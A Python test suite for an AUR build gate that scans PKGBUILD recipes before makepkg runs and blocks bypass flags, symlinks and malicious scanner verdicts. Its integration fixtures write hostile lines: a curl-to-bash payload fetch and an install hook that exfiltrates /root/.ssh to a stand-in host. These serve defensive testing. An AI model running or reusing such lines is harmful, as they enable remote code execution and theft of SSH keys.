import contextlib
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import guard


def result(tier="Trusted", status="complete"):
    return {"package": "test", "score": 100, "tier": tier, "status": status,
            "schema_version": 2, "signals": [], "override_gate_fired": None}


class GateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="aur-guard-test-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.recipe = self.root / "recipe"
        self.recipe.mkdir()
        (self.recipe / "PKGBUILD").write_text("pkgname=test\npkgver=1\npkgrel=1\n")
        self.reports = self.root / "reports"
        display = patch.object(guard, "DISPLAY", self.root / "display")
        display.start()
        self.addCleanup(display.stop)

    def fake_scanner(self, body):
        executable = self.root / "scanner"
        executable.write_text("#!/usr/bin/python3 -I\n" + body + "\n")
        executable.chmod(0o700)
        return executable

    def test_paths_are_portable_and_scanner_configuration_is_isolated(self):
        self.assertEqual(guard.HOME, Path.home())
        self.assertEqual(guard.STATE.name, "guard")
        self.assertEqual(guard.STATE.parent.name, "package-menu")
        environment = guard.scanner_environment()
        self.assertEqual(environment["XDG_CONFIG_HOME"], str(guard.STATE / "config"))
        self.assertNotIn("/home/ajsem", Path(guard.__file__).read_text())

    def test_metadata_and_source_options_are_not_bypasses(self):
        for option in ["--printsrcinfo", "--packagelist", "--verifysource", "--nobuild", "-o", "--source", "--geninteg"]:
            self.assertEqual(guard.request_directory([option], self.recipe), self.recipe)

    def test_help_and_version_need_no_recipe(self):
        self.assertIsNone(guard.request_directory(["--help"], self.root))
        self.assertIsNone(guard.request_directory(["-V"], self.root))

    def test_directory_and_fakeroot_match_makepkg(self):
        self.assertEqual(guard.request_directory(["-D", "recipe"], self.root), self.recipe)
        self.assertEqual(guard.request_directory(["-F", "-D", "/not-used"], self.recipe), self.recipe)

    def test_no_alternate_script_or_integrity_bypass(self):
        for args in [["-p", "other"], ["--skipinteg"], ["--skippgpcheck"], ["--skipchecksums"], ["BUILDFILE=other"], ["CHDIR=/elsewhere"]]:
            with self.assertRaises(guard.Blocked):
                guard.request_directory(args, self.recipe)
        self.assertEqual(guard.request_directory(["MAKEFLAGS=-j4"], self.recipe), self.recipe)

    def test_symlinked_recipe_is_blocked(self):
        (self.recipe / "PKGBUILD").unlink()
        (self.root / "payload").write_text("not evaluated")
        (self.recipe / "PKGBUILD").symlink_to(self.root / "payload")
        with self.assertRaises(guard.Blocked):
            guard.request_directory([], self.recipe)

    def test_confined_license_symlink_is_hashed_with_its_target(self):
        license_file = self.recipe / "LICENSE"
        license_file.write_text("first license")
        (self.recipe / "LICENSES").mkdir()
        (self.recipe / "LICENSES/0BSD.txt").symlink_to("../LICENSE")
        before = guard.fingerprint(self.recipe)
        license_file.write_text("changed license")
        self.assertNotEqual(guard.fingerprint(self.recipe), before)

    def test_escaping_directory_broken_and_build_output_links_are_blocked(self):
        outside = self.root / "outside"
        outside.write_text("unreviewed")
        (self.recipe / "src").mkdir()
        (self.recipe / "src/download").write_text("downloaded")
        for target in [outside, self.root, self.root / "missing", self.recipe / "src/download"]:
            with self.subTest(target=target):
                link = self.recipe / "link"
                link.symlink_to(target)
                try:
                    with self.assertRaises(guard.Blocked):
                        guard.fingerprint(self.recipe)
                finally:
                    link.unlink()

    def test_unknown_schema_and_all_blocking_tiers(self):
        for tier in ["Sketchy", "Suspicious", "Malicious", "Unknown", "unexpected"]:
            self.assertFalse(guard.verdict_allowed(result(tier)))
        self.assertFalse(guard.verdict_allowed(result(status="incomplete")))
        self.assertFalse(guard.verdict_allowed(result(), 1))
        self.assertFalse(guard.verdict_allowed({**result(), "schema_version": 3}))
        self.assertFalse(guard.verdict_allowed({**result(), "score": True}))
        self.assertTrue(guard.verdict_allowed(result()))
        self.assertTrue(guard.verdict_allowed(result("Ok")))

    def test_real_subprocess_protocol(self):
        scanner = self.fake_scanner(f"import json; print(json.dumps({result()!r}))")
        report, allowed = guard.run_scan(self.recipe, scanner=scanner)
        self.assertTrue(allowed)
        self.assertEqual(report["tier"], "Trusted")

    def test_invalid_json_and_missing_scanner_block(self):
        scanner = self.fake_scanner("print('not JSON')")
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=scanner)
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=self.root / "missing")

    def test_native_report_is_shown_without_polluting_stdout(self):
        scanner = self.fake_scanner(
            f"import json, sys; assert '--show-report' in sys.argv; "
            f"print(json.dumps({result()!r})); "
            "print('traur: test (trust: 100/100)\\n  Trust: TRUSTED', file=sys.stderr)"
        )
        with contextlib.redirect_stdout(io.StringIO()) as stdout, contextlib.redirect_stderr(io.StringIO()) as stderr:
            _, allowed = guard.run_scan(self.recipe, scanner=scanner)
        self.assertTrue(allowed)
        self.assertEqual(stdout.getvalue(), "")
        self.assertIn("Scanning build recipe", stderr.getvalue())
        self.assertIn("traur: test", stderr.getvalue())
        self.assertIn("Trust: TRUSTED", stderr.getvalue())

    def test_native_report_cannot_inject_terminal_controls(self):
        scanner = self.fake_scanner(
            f"import json, sys; print(json.dumps({result()!r})); "
            "print('report\\x1b]52;c;payload\\x07', file=sys.stderr)"
        )
        with contextlib.redirect_stderr(io.StringIO()) as stderr:
            guard.run_scan(self.recipe, scanner=scanner)
        self.assertNotIn("\x1b", stderr.getvalue())
        self.assertNotIn("\x07", stderr.getvalue())

    def test_repeated_success_report_is_hidden_but_scanner_runs_every_time(self):
        count = self.root / "scan-count"
        scanner = self.fake_scanner(
            "import json, sys\nfrom pathlib import Path\n"
            f"p=Path({str(count)!r}); p.write_text(p.read_text()+'x' if p.exists() else 'x')\n"
            f"print(json.dumps({result()!r}))\n"
            "print('traur: test (trust: 100/100)', file=sys.stderr)"
        )
        with contextlib.redirect_stderr(io.StringIO()) as stderr:
            for _ in range(3):
                _, allowed = guard.run_scan(self.recipe, scanner=scanner)
                self.assertTrue(allowed)
        self.assertEqual(count.read_text(), "xxx")
        self.assertEqual(stderr.getvalue().count("traur: test"), 1)

    def test_changed_results_failures_and_recovery_are_always_visible(self):
        self.assertTrue(guard.show_report_once(self.recipe, result(), True, "local"))
        self.assertFalse(guard.show_report_once(self.recipe, result(), True, "local"))
        changed = {**result("Ok"), "score": 75}
        self.assertTrue(guard.show_report_once(self.recipe, changed, True, "local"))
        self.assertTrue(guard.show_report_once(self.recipe, result("Malicious"), False, "local"))
        self.assertTrue(guard.show_report_once(self.recipe, result("Malicious"), False, "local"))
        self.assertTrue(guard.show_report_once(self.recipe, changed, True, "local"))

    def test_display_state_cannot_authorize_a_blocked_verdict(self):
        guard.show_report_once(self.recipe, result(), True, "local")
        scanner = self.fake_scanner(f"import json; print(json.dumps({result('Malicious')!r}))")
        _, allowed = guard.run_scan(self.recipe, scanner=scanner)
        self.assertFalse(allowed)

    def test_corrupt_display_state_never_blocks_or_hides_the_report(self):
        guard.show_report_once(self.recipe, result(), True, "local")
        for path in guard.DISPLAY.glob("*.json"):
            path.write_text("[]")
        self.assertTrue(guard.show_report_once(self.recipe, result(), True, "local"))

    def test_timeout_blocks(self):
        scanner = self.fake_scanner("import time; time.sleep(30)")
        with self.assertRaises(guard.Blocked):
            guard.run_scan(self.recipe, scanner=scanner, timeout=0.05)

    def test_interrupted_scan_kills_its_process_group_and_does_not_approve(self):
        scanner = self.fake_scanner("pass")
        with patch.object(guard.subprocess, "Popen") as start, patch.object(guard.os, "killpg") as kill:
            process = start.return_value
            process.pid = 12345
            process.communicate.side_effect = [KeyboardInterrupt, ("", "")]
            with self.assertRaises(KeyboardInterrupt):
                guard.run_scan(self.recipe, scanner=scanner)
        kill.assert_called_once_with(12345, guard.signal.SIGKILL)
        self.assertEqual(process.communicate.call_count, 2)

    def test_cancelled_gate_does_not_report_a_denial_or_execute_makepkg(self):
        with patch.object(guard, "gate", side_effect=KeyboardInterrupt), patch.object(guard.Path, "cwd", return_value=self.recipe), patch.object(guard.os, "execve") as execute, patch.object(guard, "report_block") as report, contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(guard.main([]), 130)
        execute.assert_not_called()
        report.assert_not_called()

    def test_remote_scan_cannot_approve_a_report_for_another_package(self):
        scanner = self.fake_scanner(f"import json; print(json.dumps({result()!r}))")
        with self.assertRaisesRegex(guard.Blocked, "different AUR package"):
            guard.run_scan(self.recipe, scanner=scanner, package="other")

    def test_pass_preserves_stdout_and_private_report(self):
        with patch.object(guard, "run_scan", return_value=(result(), True)), contextlib.redirect_stdout(io.StringIO()) as stdout, contextlib.redirect_stderr(io.StringIO()):
            guard.gate(self.recipe, reports=self.reports)
        self.assertEqual(stdout.getvalue(), "")
        files = list(self.reports.glob("*.json"))
        self.assertEqual(len(files), 1)
        self.assertEqual(files[0].stat().st_mode & 0o777, 0o600)

    def test_changed_inputs_block(self):
        def scan(*args, **kwargs):
            (self.recipe / "PKGBUILD").write_text("changed input")
            return result(), True
        with patch.object(guard, "run_scan", side_effect=scan), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)

    def test_detection_has_no_interactive_continue(self):
        with patch.object(guard, "run_scan", return_value=(result("Malicious"), False)), patch("builtins.input", side_effect=AssertionError("must not prompt")), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)

    def test_denial_can_emit_a_private_ui_event_without_executing_makepkg(self):
        events = self.root / "events.jsonl"
        events.touch(mode=0o600)
        error = guard.Blocked("Malicious recipe", approval_key="a" * 64)
        with patch.dict(os.environ, {"PACKAGE_MENU_GATE_EVENT": str(events)}), patch.object(guard, "request_directory", return_value=self.recipe), patch.object(guard, "gate", side_effect=error), patch.object(guard.os, "execve") as execute, contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(guard.main([]), 1)
        execute.assert_not_called()
        event = json.loads(events.read_text())
        self.assertTrue(event["blocked"])
        self.assertEqual(event["approval_key"], "a" * 64)

    def test_explicit_approval_is_bound_to_exact_inputs_and_report(self):
        report = result("Malicious")
        with patch.object(guard, "run_scan", return_value=(report, False)), contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(guard.Blocked) as denied:
                guard.gate(self.recipe, reports=self.reports)
            key = denied.exception.approval_key
            path = self.root / "approvals.json"
            path.touch(mode=0o600)
            path.write_text(json.dumps({"version": 1, "keys": [key]}))
            with patch.dict(os.environ, {"PACKAGE_MENU_GATE_APPROVAL": str(path)}):
                guard.gate(self.recipe, reports=self.reports)
                original = (self.recipe / "PKGBUILD").read_text()
                (self.recipe / "PKGBUILD").write_text(original)
                guard.gate(self.recipe, reports=self.reports)  # Identical bytes, new timestamps.
                (self.recipe / "PKGBUILD").write_text("changed recipe")
                with self.assertRaises(guard.Blocked):
                    guard.gate(self.recipe, reports=self.reports)
        with patch.object(guard, "run_scan", return_value=(report, False)), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)

    def test_public_symlinked_or_invalid_approval_files_cannot_override(self):
        path = self.root / "approvals.json"
        path.touch(mode=0o600)
        key = "a" * 64
        for data in ({"version": 1, "keys": key}, {"version": 2, "keys": [key]}, []):
            path.write_text(json.dumps(data))
            with patch.dict(os.environ, {"PACKAGE_MENU_GATE_APPROVAL": str(path)}):
                self.assertFalse(guard.approved_once(key))
        path.write_text(json.dumps({"version": 1, "keys": [key]}))
        path.chmod(0o644)
        with patch.dict(os.environ, {"PACKAGE_MENU_GATE_APPROVAL": str(path)}):
            self.assertFalse(guard.approved_once(key))
        path.chmod(0o600)
        link = self.root / "approval-link"
        link.symlink_to(path)
        with patch.dict(os.environ, {"PACKAGE_MENU_GATE_APPROVAL": str(link)}):
            self.assertFalse(guard.approved_once(key))

    def test_aur_identity_is_static_and_supports_split_packages(self):
        (self.recipe / ".git").mkdir()
        (self.recipe / ".git/config").write_text('[remote "origin"]\nurl = https://aur.archlinux.org/split-base.git\n')
        (self.recipe / ".SRCINFO").write_text("pkgbase = split-base\npkgname = actual-package\n")
        self.assertEqual(guard.aur_package(self.recipe), "actual-package")
        (self.recipe / ".SRCINFO").write_text("pkgname = ../../invalid\n")
        with self.assertRaises(guard.Blocked):
            guard.aur_package(self.recipe)

    def test_provenance_cache_is_content_and_scanner_bound(self):
        scanner = self.fake_scanner("pass")
        cache = self.root / "cache"
        with patch.object(guard, "run_scan", return_value=(result(), True)) as scan, contextlib.redirect_stderr(io.StringIO()):
            guard.provenance_check(self.recipe, "content1", "test", scanner=scanner, cache=cache)
            guard.provenance_check(self.recipe, "content1", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 1)
            guard.provenance_check(self.recipe, "content2", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 2)
            scanner.write_text("changed scanner")
            guard.provenance_check(self.recipe, "content2", "test", scanner=scanner, cache=cache)
            self.assertEqual(scan.call_count, 3)

    def test_failed_provenance_is_not_cached(self):
        scanner = self.fake_scanner("pass")
        cache = self.root / "cache"
        with patch.object(guard, "run_scan", return_value=(result("Unknown", "incomplete"), False)), contextlib.redirect_stderr(io.StringIO()):
            _, allowed = guard.provenance_check(self.recipe, "content", "test", scanner=scanner, cache=cache)
        self.assertFalse(allowed)
        self.assertEqual(list(cache.glob("*.json")), [])

    def test_remote_failure_is_recorded_and_never_continues(self):
        with patch.object(guard, "run_scan", return_value=(result(), True)), patch.object(guard, "aur_package", return_value="test"), patch.object(guard, "provenance_check", side_effect=guard.Blocked("TLS failed")), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(guard.Blocked):
            guard.gate(self.recipe, reports=self.reports)
        reports = [json.loads(path.read_text())["result"] for path in self.reports.glob("*.json")]
        unknown = [report for report in reports if report["tier"] == "Unknown"]
        self.assertEqual(len(unknown), 1)
        self.assertIn("TLS failed", unknown[0]["reason"])

    def test_exec_uses_system_binary_and_cleans_control_environment(self):
        with patch.object(guard, "gate") as gate, patch.object(guard.Path, "cwd", return_value=self.recipe), patch.object(guard.os, "execve") as execute, patch.dict(os.environ, {"BUILDFILE": "other", "BASH_ENV": "payload", "CHDIR": "/other"}):
            guard.main(["--printsrcinfo"])
        gate.assert_called_once_with(self.recipe)
        self.assertEqual(execute.call_args.args[0], "/usr/bin/makepkg")
        self.assertNotIn("BUILDFILE", execute.call_args.args[2])
        self.assertNotIn("BASH_ENV", execute.call_args.args[2])
        self.assertNotIn("CHDIR", execute.call_args.args[2])


@unittest.skipUnless(guard.SCANNER.is_file(), "install the reviewed scanner before integration tests")
class InstalledScannerTests(unittest.TestCase):
    HEADER = "pkgname=aur-guard-fixture\npkgver=1\npkgrel=1\npkgdesc='Local protection test'\narch=('any')\nlicense=('MIT')\n"

    def setUp(self):
        state = self.enterContext(tempfile.TemporaryDirectory(prefix="package-menu-guard-state-"))
        self.enterContext(patch.dict(os.environ, {"XDG_STATE_HOME": state}))

    def invoke(self, root, *arguments):
        return subprocess.run(
            [sys.executable, "-I", str(Path(guard.__file__)), *arguments],
            cwd=root, capture_output=True, text=True, timeout=55,
        )

    def test_benign_metadata_query_reaches_makepkg_without_stdout_noise(self):
        with tempfile.TemporaryDirectory(prefix="aur-good-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "source=()\npackage() { :; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertIn("pkgbase = aur-guard-fixture", completed.stdout)
        self.assertNotIn("[AUR protection]", completed.stdout)
        self.assertIn("traur:", completed.stderr)
        self.assertIn("Trust:", completed.stderr)

    def test_json_and_native_report_describe_the_same_scan(self):
        with tempfile.TemporaryDirectory(prefix="aur-report-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "source=()\npackage() { :; }\n")
            completed = subprocess.run(
                [str(guard.SCANNER), "scan", "--dir", str(root), "--json", "--show-report"],
                env=guard.scanner_environment(), capture_output=True, text=True, timeout=45,
            )
        data = json.loads(completed.stdout)
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertEqual(data["status"], "complete")
        self.assertIn(f"trust: {data['score']}/100", completed.stderr)
        self.assertIn(data["package"], completed.stderr)

    def test_hostile_top_level_never_runs_even_for_metadata_queries(self):
        with tempfile.TemporaryDirectory(prefix="aur-hostile-") as directory:
            root = Path(directory)
            marker = root / "EXECUTED"
            (root / "PKGBUILD").write_text(
                self.HEADER + f"printf executed > '{marker}'\n"
                + "build() { eval \"$(curl -s https://example.invalid/payload | base64 -d | bash)\"; }\n"
            )
            for option in ["--printsrcinfo", "--packagelist", "--verifysource"]:
                completed = self.invoke(root, option)
                self.assertNotEqual(completed.returncode, 0)
                self.assertIn("BLOCKED", completed.stderr)
                self.assertFalse(marker.exists(), "PKGBUILD ran before being rejected")

    @unittest.skipUnless(Path("/usr/bin/paru").is_file(), "install paru for this integration test")
    def test_paru_build_uses_explicit_bundled_gate_without_global_configuration(self):
        with tempfile.TemporaryDirectory(prefix="aur-paru-integration-") as directory:
            root = Path(directory)
            marker = root / "EXECUTED"
            (root / "PKGBUILD").write_text(
                self.HEADER + f"printf executed > '{marker}'\n"
                + "build() { eval \"$(curl -s https://example.invalid/payload | base64 -d | bash)\"; }\n"
                + "package() { :; }\n"
            )
            # -B without -i only builds; --nodeps prevents dependency installs.
            completed = subprocess.run(
                ["/usr/bin/paru", "--makepkg", str(Path(guard.__file__).parent / "makepkg-wrapper"),
                 "-B", "--nodeps", "--noconfirm", str(root)],
                cwd=root, capture_output=True, text=True, timeout=55,
            )
            self.assertNotEqual(completed.returncode, 0)
            self.assertIn("[AUR protection]", completed.stderr)
            self.assertIn("BLOCKED", completed.stderr)
            self.assertFalse(marker.exists(), "paru evaluated PKGBUILD before the guard")

    def test_unreadable_install_script_is_unknown_not_passed(self):
        with tempfile.TemporaryDirectory(prefix="aur-missing-install-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "install='missing.install'\npackage() { :; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("Unknown", completed.stderr)

    def test_install_script_payload_is_rejected_before_metadata(self):
        with tempfile.TemporaryDirectory(prefix="aur-install-script-") as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text(self.HEADER + "install='payload.install'\npackage() { :; }\n")
            (root / "payload.install").write_text("post_install() { tar czf - /root/.ssh | base64 -w0 | xargs -I{} curl -s -d {} https://example.invalid/c; }\n")
            completed = self.invoke(root, "--printsrcinfo")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("Malicious", completed.stderr)

    def test_aliased_install_script_payload_is_still_blocked(self):
        with tempfile.TemporaryDirectory(prefix="aur-alias-install-") as directory:
            root = Path(directory)
            marker = root / "EXECUTED"
            (root / "PKGBUILD").write_text(
                self.HEADER + "_base=test\n_appname=${_base}\ninstall=\"${_appname}.install\"\n"
                + f"printf executed > '{marker}'\npackage() {{ :; }}\n"
            )
            (root / "test.install").write_text("post_install() { tar czf - /root/.ssh | base64 -w0 | xargs -I{} curl -s -d {} https://example.invalid/c; }\n")
            completed = self.invoke(root, "--printsrcinfo")
            self.assertFalse(marker.exists(), "PKGBUILD ran before checking the aliased install script")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("Malicious", completed.stderr)


if __name__ == "__main__":
    unittest.main()
